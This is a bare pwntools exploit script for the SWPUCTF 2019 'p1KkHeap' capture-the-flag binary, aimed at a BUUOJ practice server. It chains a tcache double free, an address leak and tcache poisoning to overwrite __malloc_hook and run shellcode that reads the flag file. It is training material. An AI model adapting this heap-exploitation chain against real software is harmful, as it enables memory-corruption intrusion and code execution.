#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/16 20:39:54
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('SWPUCTF_2019_p1KkHeap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 29141
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/18-64-libc-2.27.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('SWPUCTF_2019_p1KkHeap')


def cmd(choice):
    sh.recvuntil("Your Choice: ")
    sh.sendline(str(choice))

def add(size):
    cmd(1)
    sh.recvuntil("size: ")
    sh.sendline(str(size))

def edit(idx,content):
    cmd(3)
    sh.recvuntil("id: ")
    sh.sendline(str(idx))
    sh.recvuntil("content: ")
    sh.sendline(content)

def show(idx):
    cmd(2)
    sh.recvuntil("id: ")
    sh.sendline(str(idx))

def dele(idx):
    cmd(4)
    sh.recvuntil("id: ")
    sh.sendline(str(idx))

add(0x100) #0
add(0x100) #1
dele(1)
dele(1)
show(1)
sh.recvuntil("content: ")
heap_addr = u64(sh.recv(6).ljust(8,"\x00")) - 0x370
log.success("Success leak heap_addr:0x%x"%heap_addr)
add(0x100) #2
edit(2,p64(heap_addr+0x10)*2)
add(0x100) #3
add(0x100) #4
payload = "\x00" * 0xb8 + p64(0x66660000)
edit(4,payload)
add(0x100) #5
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read(3,0x66660300,0x50)
shellcode += shellcraft.write(1,0x66660300,0x50)
payload = asm(shellcode)
edit(5,payload)
dele(0)
show(0)
sh.recvuntil("content: ")
libc_base = u64(sh.recv(6).ljust(8,"\x00")) - 0x3ebca0
log.success("Success leak libc_base:0x%x"%libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
payload = "\x00" * 0xb8 + p64(malloc_hook)
edit(4,payload)
add(0x100) #6
edit(6,p64(0x66660000))
add(0x100) #7
sh.interactive()

